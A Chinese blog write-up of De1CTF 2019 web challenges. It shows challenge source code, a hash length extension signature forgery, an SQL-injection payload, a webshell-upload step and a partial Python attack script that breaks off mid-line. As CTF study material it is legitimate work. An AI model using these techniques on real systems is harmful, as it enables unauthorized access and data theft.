@@ -1,0 +1,458 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>De1CTF部分wp | 悦昕_o&#39;s Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  
+  
+  
+    <link rel="alternate" href="/atom.xml" title="悦昕_o's Blog" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/localshare/css/share.css">
+
+  
+  
+  
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">悦昕_o&#39;s Blog</a>
+      </h1>
+      
+        <h2 id="subtitle-wrap">
+          <a href="/" id="subtitle">不来不去 如来 o(*￣▽￣*)ブ</a>
+        </h2>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        
+          <a class="main-nav-link" href="/."><i class="fa fa-home"></i> 首页</a>
+        
+          <a class="main-nav-link" href="/archives/"><i class="fa fa-archive"></i> 归档</a>
+        
+          <a class="main-nav-link" href="/about/"><i class="fa fa-user"></i> 关于</a>
+        
+          <a class="main-nav-link" href="/atom.xml"><i class="fa fa-rss"></i> 订阅</a>
+        
+      </nav>
+    </div>
+    <div id="search-form">
+      <div id="result-mask" class="hide"></div>
+      <label><input id="search-key" type="text" autocomplete="off" placeholder="搜索"></label>
+      <div id="result-wrap" class="hide">
+        <div id="search-result"></div>
+      </div>
+      <div class="hide">
+        <template id="search-tpl">
+          <div class="item">
+            <a href="/{path}" title="{title}">
+              <div class="title">{title}</div>
+              <div class="time">{date}</div>
+              <div class="tags">{tags}</div>
+            </a>
+          </div>
+        </template>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-De1CTF-wp" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      De1CTF部分wp
+    </h1>
+  
+
+
+      </header>
+    
+    <div class="article-meta">
+      
+      <span class="article-date">
+  <i class="fa fa-date"></i>
+  <time class="dt-published" datetime="2019-09-12T01:24:17.000Z" itemprop="datePublished">2019年09月12日</time>
+</span>
+      
+  <div class="article-category">
+    <i class="fa fa-classify"></i>
+    <a class="article-category-link" href="/categories/ctf/">ctf</a>
+  </div>
+
+      
+        <span class="article-views">
+  <i class="fa fa-views"></i>
+  <i id="busuanzi_container_page_pv">
+      <i id="busuanzi_value_page_pv"></i>
+  </i>
+</span>
+
+      
+      
+<a href="/2019/09/12/De1CTF-wp/#comments" class="article-comment-link">
+  
+    
+    
+    
+    
+    
+  
+  <i class="fa fa-commt"></i>
+  留言
+</a>
+
+
+    </div>
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <blockquote>
+<p>这是之前比赛后不久就写的wp，一直没有放出来，清理东西的时候看到了就想着先放出来吧（虽然我还没写完o(╯□╰)o，有时间在补吧。嘻嘻(#^.^#)）</p>
+</blockquote>
+<span id="more"></span>
+
+<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="SSRF-Me"><a href="#SSRF-Me" class="headerlink" title="SSRF Me"></a>SSRF Me</h3><p>赛题链接：<a target="_blank" rel="noopener" href="http://139.180.128.86/">http://139.180.128.86/</a></p>
+<p>打开链接可以看到一段代码（查看源代码会有格式）</p>
+<p><img src="/2019/09/12/De1CTF-wp/QQ%E6%88%AA%E5%9B%BE20190805090902.png" alt="QQ截图20190805090902"></p>
+<p>对代码进行分析，可以看到有<code>/geneSign </code>和 <code>/De1ta </code>两个访问路径;<code>/geneSign</code>用来生成签名，get或post请求带个<code>param</code>参数，把<code>param</code>参数和<code>action</code>值传递给<code>getSign()</code>进行加密生成签名。</p>
+<p><code>/De1ta</code>才是重头戏（O(∩_∩)O哈哈~），访问该路径需要cookie设置action、sign，get请求带参param，<code>challenge()</code>调用<code>waf()</code>对<code>param</code>进行过滤：<code>不能以gopher和file开头</code>，然后调用Task类</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/geneSign&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">geneSign</span>(): <span class="comment"># 生成签名</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))   <span class="comment"># 对get请求的 param 参数进行url解码</span></span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)   <span class="comment">#调用 getSign 函数（在下面） </span></span><br><span class="line">    <span class="comment"># secert_key = os.urandom(16)-(16个字节随机数)-- </span></span><br><span class="line">    <span class="comment"># param=get请求的param参数 </span></span><br><span class="line">    <span class="comment"># action=&#x27;scan&#x27; </span></span><br><span class="line">    <span class="comment"># 返回三者md5后的结果 </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/De1ta&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge</span>():</span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))  <span class="comment"># cookie设置action,sign get参数param</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line">    ip = request.remote_addr    <span class="comment"># 获取ip</span></span><br><span class="line">    <span class="keyword">if</span>(waf(param)): <span class="comment"># 对param参数过滤，函数在下面</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip)    <span class="comment">#调用类Task 上面 初始化 创建md5(ip)为名的文件夹</span></span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())  <span class="comment">#执行task.Exec() 并将输出序列化</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&quot;code.txt&quot;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">param</span>): <span class="comment">#过滤函数 去掉param左右空格并小写化 不能以 gopher和file 开头</span></span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>
+
+<p>函数<code>getSign()</code>，由于实际上只有param可控，action默认‘scan’，但是secert_key的长度我们是知道的，因此这里存在哈希长度扩展攻击（<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/69264.html">了解哈希长度扩展攻击可以看看这篇文章</a>），因此我们可以通过工具构造不同action的签名（工具我使用的是<strong>HashPump</strong>）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">getSign</span>(<span class="params">action, param</span>):     <span class="comment"># secert_key = os.urandom(16)-(16个字节随机数) param=get请求的param参数 action=&#x27;scan&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br></pre></td></tr></table></figure>
+
+<p>类<code>Task</code>，分析代码我们知道只要能让访问<code>/De1ta</code>所带的参数实现<code>getSign(self.action, self.param) == self.sign</code>就能通过<code>checkSign()</code>的验证，这里我们可以用前面提到的哈希长度扩展攻击来构造出我们想要的参数；可以看到我们需要走通<code>if &quot;scan&quot; in self.action:</code>来读取param参数的文件并把它存在一个result.txt文件中，然后当<code>if &quot;read&quot; in self.action:</code>成立时再去读取result.txt，并返回读取到的内容</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Task</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, action, param, sign, ip</span>):</span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):          <span class="comment">#SandBox For Remote_Addr 创建一个md5(ip)为名的文件夹 	15121d42524062a01cf877e045146508</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Exec</span>(<span class="params">self</span>):</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):  <span class="comment">#&#x27;验证签名&#x27;</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)   <span class="comment"># 以写的形式打开result.txt文件</span></span><br><span class="line">                resp = scan(self.param) <span class="comment"># 进行某些操作 会根据param生成一个特殊的链接</span></span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>):</span><br><span class="line">                    result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>) <span class="comment"># 以读的形式打开result.txt文件</span></span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">checkSign</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign): <span class="comment">#验证签名 </span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>
+
+<p>因为题目提示flag在.&#x2F;flag.txt中，所以我们需要构造param为flag.txt，我们先用<code>geneSign()</code>生成action&#x3D;scan,param&#x3D;flag.txt 的签名</p>
+<p><img src="/2019/09/12/De1CTF-wp/2019-08-05_100539.bmp" alt="2019-08-05_100539"></p>
+<p>然后使用工具<strong>HashPump</strong>生成action包含read的签名</p>
+<p><img src="/2019/09/12/De1CTF-wp/1564970682579.png" alt="1564970682579"></p>
+<p>带着准备好的参数去访问<code>/De1ta</code>，得到flag</p>
+<p><img src="/2019/09/12/De1CTF-wp/2019-08-05_100042.bmp" alt="2019-08-05_100042"></p>
+<h3 id="shellshellshell"><a href="#shellshellshell" class="headerlink" title="shellshellshell"></a>shellshellshell</h3><blockquote>
+<p>这道题是参考大佬们的wp，然后在<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges">这个平台</a>上面再打了一遍</p>
+</blockquote>
+<ol>
+<li><p>首先打开靶机，是一个登陆页面，用目录扫描工具扫一下（我用的是<a target="_blank" rel="noopener" href="https://github.com/WangYihang/SourceLeakHacker">SourceLeakHacker</a>），发现有两个路径能访问</p>
+<p><img src="/2019/09/12/De1CTF-wp/2019-08-16_170137.bmp" alt="2019-08-16_170137"></p>
+<p>访问<code>http://web69.node1.buuoj.cn/views/</code>发现是模板文件</p>
+<p><img src="/2019/09/12/De1CTF-wp/2019-08-16_170104.bmp" alt="2019-08-16_170104"></p>
+<p>通过大佬们的wp发现还有备份文件泄露（user.php<del>,config.php</del>和index.php~），访问将文件下载到本地进行审计（我太菜了o(╥﹏╥)o ，得多练练），发现config.php中的insert函数存在sql注入</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert</span>(<span class="params"><span class="variable">$columns</span>,<span class="variable">$table</span>,<span class="variable">$values</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$column</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_column</span>(<span class="variable">$columns</span>);</span><br><span class="line">    <span class="variable">$value</span> = <span class="string">&#x27;(&#x27;</span>.<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/`([^`,]+)`/&#x27;</span>,<span class="string">&#x27;\&#x27;$&#123;1&#125;\&#x27;&#x27;</span>,<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">get_column</span>(<span class="variable">$values</span>)).<span class="string">&#x27;)&#x27;</span>;</span><br><span class="line">    <span class="variable">$nid</span> =</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&#x27;insert into &#x27;</span>.<span class="variable">$table</span>.<span class="string">&#x27;(&#x27;</span>.<span class="variable">$column</span>.<span class="string">&#x27;) values &#x27;</span>.<span class="variable">$value</span>; </span><br><span class="line">    <span class="comment">//$value = (&#x27;username&#x27;,&#x27;userid&#x27;,&#x27;$_post&#x27;,&#x27;mod&#x27;)</span></span><br><span class="line">    <span class="comment">//post提交 aaa`, `0`)#</span></span><br><span class="line">    <span class="comment">//$value = (&#x27;username&#x27;,&#x27;userid&#x27;,&#x27; aaa`, `0`)# &#x27;,&#x27;mod&#x27;)</span></span><br><span class="line">    <span class="comment">//`也可以闭合单引号</span></span><br><span class="line">    <span class="variable">$result</span> = <span class="variable language_">$this</span>-&gt;conn-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>而在user.php中的publish调用了insert函数，所以我们可以通过访问<code>http://web69.node1.buuoj.cn/index.php?action=publish</code>，编写脚本，通过对它进行sql注入，获取管理员密码为<code>jaivypassword</code>（脚本见后面）</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">publish</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;<span class="comment">//首先判断是否登录 </span></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">check_login</span>()) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;is_admin == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;signature&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;mood&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="variable">$mood</span> = <span class="title function_ invoke__">addslashes</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Mood</span>((<span class="keyword">int</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;mood&#x27;</span>],<span class="title function_ invoke__">get_ip</span>())));</span><br><span class="line">                <span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">Db</span>();</span><br><span class="line">                @<span class="variable">$ret</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">insert</span>(<span class="keyword">array</span>(<span class="string">&#x27;userid&#x27;</span>,<span class="string">&#x27;username&#x27;</span>,<span class="string">&#x27;signature&#x27;</span>,<span class="string">&#x27;mood&#x27;</span>),<span class="string">&#x27;ctf_user_signature&#x27;</span>,<span class="keyword">array</span>(<span class="variable language_">$this</span>-&gt;userid,<span class="variable language_">$this</span>-&gt;username,<span class="variable">$_POST</span>[<span class="string">&#x27;signature&#x27;</span>],<span class="variable">$mood</span>));</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$ret</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;pic&#x27;</span>])) </span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="variable">$dir</span>=<span class="string">&#x27;/app/upload/&#x27;</span>;</span><br><span class="line">                    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;pic&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>],<span class="variable">$dir</span>.<span class="variable">$_FILES</span>[<span class="string">&#x27;pic&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&#x27;pic&#x27;</span>][<span class="string">&#x27;name&#x27;</span>].<span class="string">&quot;upload success&#x27;);&lt;/script&gt;&quot;</span>;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>拿到管理员账号密码后，登录进去，来到<code>publish</code>可以看到提示并有一个文件上传的按钮</p>
+</li>
+</ol>
+<p>​	<img src="/2019/09/12/De1CTF-wp/2019-08-13_102242.bmp" alt="2019-08-13_102242"></p>
+<p>​		我们上传一个一句话木马来getshell,然后连上蚁剑</p>
+<p>未完待续··· ···</p>
+<hr>
+<p>（图先存着，之后有时间再详细说下 (#^.^#) )</p>
+<p>（脚本先放出来啦，如需使用可以自己试着慢慢调试）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-   </span></span><br><span class="line"><span class="keyword">import</span> hashlib,requests,re,os,string,random</span><br><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">codes</span>(<span class="params">cipher</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        plain = os.urandom(<span class="number">16</span>).<span class="built_in">hex</span>()</span><br><span class="line">        <span class="keyword">if</span> hashlib.md5(plain.encode(<span class="string">&quot;utf-8&quot;</span>)).hexdigest()[:<span class="number">5</span>] == cipher:</span><br><span class="line">            <span class="keyword">return</span> plain</span><br><span class="line">            exit(-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 爆破code</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_code</span>(<span class="params">html</span>):</span><br><span class="line">    re_res = re.findall(<span class="string">&#x27;Code\(substr\(md5\(\?\), 0, 5\) === ([\w]+)\)&#x27;</span>,html)[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[md5]: &quot;</span>+re_res)</span><br><span class="line">    p = multiprocessing.Pool(<span class="number">15</span>)</span><br><span class="line">    code = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        res = p.apply_async(codes,(re_res,))</span><br><span class="line">        <span class="keyword">if</span> res.get() != <span class="literal">None</span>:</span><br><span class="line">            code = res.get()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[code]: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(code))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    p.close()</span><br><span class="line">    p.join()</span><br><span class="line">    <span class="keyword">return</span> code</span><br><span class="line"></span><br><span class="line"><span class="comment"># 注册</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>(<span class="params">username,password</span>):</span><br><span class="line">    url = target + <span class="string">&quot;register&quot;</span></span><br><span class="line">    get_res = sess.get(url)<span class="comment">#,cookies=cookies)</span></span><br><span class="line">    usersess = re.findall(<span class="string">&#x27;PHPSESSID=(\w+);&#x27;</span>,get_res.headers[<span class="string">&#x27;Set-Cookie&#x27;</span>])[<span class="number">0</span>] <span class="comment">#获取用户sessid</span></span><br><span class="line">    code = get_code(get_res.text)</span><br><span class="line">    post_res = sess.post(url,data=&#123;<span class="string">&#x27;username&#x27;</span>:username, <span class="string">&#x27;password&#x27;</span>:password, <span class="string">&#x27;code&#x27;</span>:code&#125;)<span class="comment">#,cookies=cookies)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;index.php?action=login&#x27;</span> <span class="keyword">in</span> post_res.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[User Session]: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(usersess))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[Register]: Register Success!\n&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(post_res.text)</span><br><span class="line">        exit(-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 登录</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">username,password</span>):</span><br><span class="line">    url = target + <span class="string">&quot;login&quot;</span></span><br><span class="line">    get_res = sess.get(url)<span class="comment">#,cookies=cookies)</span></span><br><span class="line">    code = get_code(get_res.text)</span><br><span class="line">    post_res = sess.post(url,data=&#123;<span class="string">&#x27;username&#x27;</span>:username, <span class="string">&#x27;password&#x27;</span>:password, <span class="string">&#x27;code&#x27;</span>:code&#125;)<span class="comment">#,cookies=cookies)</span></span><br><span class="line">    <span class="keyword">if</span> <span 